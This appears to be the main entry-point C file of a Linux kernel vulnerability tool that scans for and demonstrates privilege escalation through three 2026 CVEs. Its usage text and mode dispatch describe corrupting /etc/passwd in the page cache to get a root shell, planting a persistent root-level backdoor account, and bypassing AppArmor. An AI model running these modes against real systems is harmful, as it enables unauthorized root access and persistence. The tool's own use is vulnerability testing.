/*
 * DIRTYFAIL — main entry point
 *
 * A single binary that detects and (with explicit consent) demonstrates
 * exploitation of:
 *
 *   - Copy Fail            CVE-2026-31431
 *   - Dirty Frag (xfrm-ESP) CVE-2026-43284
 *   - Dirty Frag (RxRPC)    CVE-2026-43500
 *
 * Default mode is detection. The exploit modes never run without
 * --exploit on the command line *and* a typed-string confirmation at
 * runtime.
 *
 * Exit codes:
 *   0  not vulnerable (or: exploit succeeded — semantically "you can
 *      now type `exit` and the test ran")
 *   1  test error / could not determine
 *   2  vulnerable
 *   3  exploit attempted but did not land
 *   4  preconditions not met (effectively "not vulnerable here")
 *   5  exploit succeeded and a root shell was spawned
 */

#include "common.h"
#include "copyfail.h"
#include "copyfail_gcm.h"
#include "dirtyfrag_esp.h"
#include "dirtyfrag_esp6.h"
#include "dirtyfrag_rxrpc.h"
#include "apparmor_bypass.h"
#include "backdoor.h"

#include <getopt.h>
#include <fcntl.h>

static const char BANNER[] =
"\n"
" ██████╗ ██╗██████╗ ████████╗██╗   ██╗███████╗ █████╗ ██╗██╗      \n"
" ██╔══██╗██║██╔══██╗╚══██╔══╝╚██╗ ██╔╝██╔════╝██╔══██╗██║██║      \n"
" ██║  ██║██║██████╔╝   ██║    ╚████╔╝ █████╗  ███████║██║██║      \n"
" ██║  ██║██║██╔══██╗   ██║     ╚██╔╝  ██╔══╝  ██╔══██║██║██║      \n"
" ██████╔╝██║██║  ██║   ██║      ██║   ██║     ██║  ██║██║███████╗ \n"
" ╚═════╝ ╚═╝╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝ \n"
"            Copy Fail + Dirty Frag detector & PoC\n"
"            CVE-2026-31431 / 43284 / 43500\n";

static void usage(const char *prog)
{
    fprintf(stderr,
"Usage: %s [MODE] [OPTIONS]\n"
"\n"
"Modes (pick one; default is --scan):\n"
"  --scan                 detect all three CVEs (no system modification)\n"
"  --check-copyfail       Copy Fail (CVE-2026-31431) detection only\n"
"  --check-esp            Dirty Frag xfrm-ESP (CVE-2026-43284) detection only\n"
"  --check-rxrpc          Dirty Frag RxRPC   (CVE-2026-43500) detection only\n"
"  --check-esp6           IPv6 xfrm-ESP path (CVE-2026-43284 v6) detection\n"
"  --check-gcm            Copy Fail GCM variant detection\n"
"  --exploit-copyfail     real PoC: flip /etc/passwd UID via algif_aead\n"
"  --exploit-esp          real PoC: flip /etc/passwd UID via xfrm-ESP (v4)\n"
"  --exploit-esp6         real PoC: flip /etc/passwd UID via xfrm-ESP (v6)\n"
"  --exploit-rxrpc        real PoC: empty /etc/passwd root pwd via rxkad\n"
"                         (fcrypt brute-force + AF_RXRPC handshake forgery)\n"
"  --exploit-gcm          real PoC: flip /etc/passwd UID via rfc4106(gcm(aes))\n"
"                         single-byte primitive (works when authencesn is\n"
"                         blacklisted but rfc4106 isn't)\n"
"  --exploit-backdoor     PERSISTENT: insert sick:0:0:::/:/bin/bash into\n"
"                         /etc/passwd page cache; survives shell exit until\n"
"                         page eviction. Use --cleanup-backdoor to revert.\n"
"  --cleanup              evict /etc/passwd from page cache and drop_caches\n"
"  --cleanup-backdoor     restore /etc/passwd line from /var/tmp/.dirtyfail.state\n"
"  --version              print version\n"
"  --help                 this message\n"
"\n"
"Options:\n"
"  --no-shell             after a successful exploit, do NOT execve `su`;\n"
"                         instead revert the page-cache patch and exit\n"
"  --no-color             disable ANSI color in output\n"
"  --aa-bypass            force the AppArmor unprivileged-userns bypass\n"
"                         (auto-armed when restricted profile is detected)\n"
"\n"
"Exit codes:\n"
"  0 not vulnerable / clean    2 vulnerable     5 exploit succeeded\n"
"  1 test error                3 exploit failed 4 preconditions missing\n"
"\n"
"AUTHORIZED TESTING ONLY. Run only on systems you own or are explicitly\n"
"engaged to assess. The --exploit modes corrupt /etc/passwd in the\n"
"kernel page cache; cleanup with --cleanup or `echo 3 > /proc/sys/vm/drop_caches`.\n",
    prog);
}

enum mode {
    MODE_SCAN,
    MODE_CHECK_COPYFAIL,
    MODE_CHECK_ESP,
    MODE_CHECK_ESP6,
    MODE_CHECK_RXRPC,
    MODE_CHECK_GCM,
    MODE_EXPLOIT_COPYFAIL,
    MODE_EXPLOIT_ESP,
    MODE_EXPLOIT_ESP6,
    MODE_EXPLOIT_RXRPC,
    MODE_EXPLOIT_GCM,
    MODE_EXPLOIT_BACKDOOR,
    MODE_CLEANUP,
    MODE_CLEANUP_BACKDOOR,
    MODE_HELP,
    MODE_VERSION,
};

#define DIRTYFAIL_VERSION "0.1.0"

int main(int argc, char **argv)
{
    /* If we're a re-exec from the apparmor bypass dance, route to the
     * stage handler immediately. It either re-execs again (stage 1) or
     * returns rewritten argv with us inside a fresh userns (stage 2). */
    if (apparmor_bypass_is_stage(argc, argv)) {
        int new_argc = argc;
        char **new_argv = argv;
        if (apparmor_bypass_run_stage(argc, argv, &new_argc, &new_argv) != 0) {
            fprintf(stderr, "apparmor bypass stage failed\n");
            return 1;
        }
        argc = new_argc;
        argv = new_argv;
    }

    enum mode m        = MODE_SCAN;
    bool      do_shell = true;
    bool      aa_bypass = false;

    static const struct option opts[] = {
        {"scan",             no_argument, NULL, 'S'},
        {"check-copyfail",   no_argument, NULL,  1 },
        {"check-esp",        no_argument, NULL,  2 },
        {"check-rxrpc",       no_argument, NULL,  3 },
        {"check-esp6",        no_argument, NULL,  9 },
        {"check-gcm",         no_argument, NULL, 10 },
        {"exploit-copyfail",  no_argument, NULL,  4 },
        {"exploit-esp",       no_argument, NULL,  5 },
        {"exploit-esp6",      no_argument, NULL, 11 },
        {"exploit-rxrpc",     no_argument, NULL,  7 },
        {"exploit-gcm",       no_argument, NULL, 12 },
        {"exploit-backdoor",  no_argument, NULL, 13 },
        {"cleanup",           no_argument, NULL,  6 },
        {"cleanup-backdoor",  no_argument, NULL, 14 },
        {"no-shell",         no_argument, NULL, 'n'},
        {"no-color",         no_argument, NULL, 'C'},
        {"aa-bypass",        no_argument, NULL,  8 },
        {"help",             no_argument, NULL, 'h'},
        {"version",          no_argument, NULL, 'V'},
        {0,0,0,0}
    };

    int c;
    while ((c = getopt_long(argc, argv, "ShVnC", opts, NULL)) != -1) {
        switch (c) {
            case 'S':  m = MODE_SCAN;             break;
            case  1 :  m = MODE_CHECK_COPYFAIL;   break;
            case  2 :  m = MODE_CHECK_ESP;        break;
            case  3 :  m = MODE_CHECK_RXRPC;      break;
            case  4 :  m = MODE_EXPLOIT_COPYFAIL; break;
            case  5 :  m = MODE_EXPLOIT_ESP;      break;
            case  7 :  m = MODE_EXPLOIT_RXRPC;    break;
            case  6 :  m = MODE_CLEANUP;          break;
            case  9 :  m = MODE_CHECK_ESP6;       break;
            case 10 :  m = MODE_CHECK_GCM;        break;
            case 11 :  m = MODE_EXPLOIT_ESP6;     break;
            case 12 :  m = MODE_EXPLOIT_GCM;      break;
            case 13 :  m = MODE_EXPLOIT_BACKDOOR; break;
            case 14 :  m = MODE_CLEANUP_BACKDOOR; break;
            case 'n':  do_shell = false;          break;
            case 'C':  dirtyfail_use_color = false; break;
            case  8 :  aa_bypass = true;          break;
            case 'h':  m = MODE_HELP;             break;
            case 'V':  m = MODE_VERSION;          break;
            default :  usage(argv[0]);            return 1;
        }
    }

    if (m == MODE_HELP)    { usage(argv[0]); return 0; }
    if (m == MODE_VERSION) { puts("DIRTYFAIL " DIRTYFAIL_VERSION); return 0; }

    /* For exploit modes that need a fresh user namespace (esp/esp6/rxrpc),
     * autodetect the AppArmor restriction and arm the bypass — unless
     * the user explicitly requested it (or opted out). */
    bool needs_userns = (m == MODE_EXPLOIT_ESP   || m == MODE_EXPLOIT_ESP6 ||
                         m == MODE_EXPLOIT_RXRPC || m == MODE_EXPLOIT_GCM  ||
                         m == MODE_EXPLOIT_BACKDOOR);
    if (aa_bypass || (needs_userns && apparmor_bypass_needed())) {
        if (!aa_bypass) {
            log_warn("AppArmor restricted profile detected — arming bypass");
            log_hint("(suppress with --no-aa-bypass once that flag exists)");
        }
        if (apparmor_bypass_arm_and_relaunch(argc, argv) != 0) {
            log_warn("apparmor bypass failed (%s) — continuing un-bypassed",
                     strerror(errno));
        }
        /* On success, execv replaced our image; control never returns here. */
    }

    if (dirtyfail_use_color) fputs("\033[1;35m", stdout);
    fputs(BANNER, stdout);
    if (dirtyfail_use_color) fputs("\033[0m", stdout);
    fputc('\n', stdout);

    df_result_t r = DF_OK;

    switch (m) {
    case MODE_SCAN: {
        log_step("running full scan — five detectors\n");

        df_result_t a  = copyfail_detect();         fputc('\n', stdout);
        df_result_t b  = dirtyfrag_esp_detect();    fputc('\n', stdout);
        df_result_t b6 = dirtyfrag_esp6_detect();   fputc('\n', stdout);
        df_result_t c2 = dirtyfrag_rxrpc_detect();  fputc('\n', stdout);
        df_result_t g  = copyfail_gcm_detect();     fputc('\n', stdout);

        const char *label[] = {
            [DF_OK]            = "not vulnerable",
            [DF_TEST_ERROR]    = "test error",
            [DF_VULNERABLE]    = "VULNERABLE",
            [DF_PRECOND_FAIL]  = "preconditions missing",
        };

        log_step("scan summary:");
        log_hint("  Copy Fail (algif_aead, CVE-2026-31431):     %s", label[a  & 7]);
        log_hint("  Dirty Frag ESP v4 (CVE-2026-43284):         %s", label[b  & 7]);
        log_hint("  Dirty Frag ESP v6 (CVE-2026-43284 v6):      %s", label[b6 & 7]);
        log_hint("  Dirty Frag RxRPC  (CVE-2026-43500):         %s", label[c2 & 7]);
        log_hint("  Copy Fail GCM variant (xfrm rfc4106):       %s", label[g  & 7]);

        if (a == DF_VULNERABLE || b == DF_VULNERABLE || b6 == DF_VULNERABLE ||
            c2 == DF_VULNERABLE || g == DF_VULNERABLE)
            r = DF_VULNERABLE;
        else if (a == DF_TEST_ERROR || b == DF_TEST_ERROR || b6 == DF_TEST_ERROR ||
                 c2 == DF_TEST_ERROR || g == DF_TEST_ERROR)
            r = DF_TEST_ERROR;
        else
            r = DF_OK;
        break;
    }

    case MODE_CHECK_COPYFAIL: r = copyfail_detect();        break;
    case MODE_CHECK_ESP:      r = dirtyfrag_esp_detect();   break;
    case MODE_CHECK_ESP6:     r = dirtyfrag_esp6_detect();  break;
    case MODE_CHECK_RXRPC:    r = dirtyfrag_rxrpc_detect(); break;
    case MODE_CHECK_GCM:      r = copyfail_gcm_detect();    break;

    case MODE_EXPLOIT_COPYFAIL:
        log_warn("running real PoC for Copy Fail (CVE-2026-31431)");
        r = copyfail_exploit(do_shell);
        break;

    case MODE_EXPLOIT_ESP:
        log_warn("running real PoC for Dirty Frag xfrm-ESP (CVE-2026-43284)");
        r = dirtyfrag_esp_exploit(do_shell);
        break;

    case MODE_EXPLOIT_RXRPC:
        log_warn("running real PoC for Dirty Frag RxRPC (CVE-2026-43500)");
        r = dirtyfrag_rxrpc_exploit(do_shell);
        break;

    case MODE_EXPLOIT_ESP6:
        log_warn("running real PoC for Dirty Frag IPv6 xfrm-ESP");
        r = dirtyfrag_esp6_exploit(do_shell);
        break;

    case MODE_EXPLOIT_GCM:
        log_warn("running real PoC for Copy Fail GCM variant (rfc4106)");
        r = copyfail_gcm_exploit(do_shell);
        break;

    case MODE_EXPLOIT_BACKDOOR:
        log_warn("installing PERSISTENT backdoor user 'sick' (page-cache only)");
        r = backdoor_install(do_shell);
        break;

    case MODE_CLEANUP_BACKDOOR:
        r = backdoor_cleanup();
        break;

    case MODE_CLEANUP:
        log_step("evicting /etc/passwd page cache");
        int fd = open("/etc/passwd", O_RDONLY);
        if (fd >= 0) {
#ifdef POSIX_FADV_DONTNEED
            posix_fadvise(fd, 0, 0, POSIX_FADV_DONTNEED);
#endif
            close(fd);
        }
        if (geteuid() == 0) {
            log_step("dropping caches (requires root)");
            if (drop_caches()) log_ok("drop_caches OK");
            else log_warn("drop_caches failed: %s", strerror(errno));
        } else {
            log_hint("not root; run `sudo dirtyfail --cleanup` to drop_caches");
        }
        r = DF_OK;
        break;

    default:
        usage(argv[0]);
        return 1;
    }

    return (int)r;
}
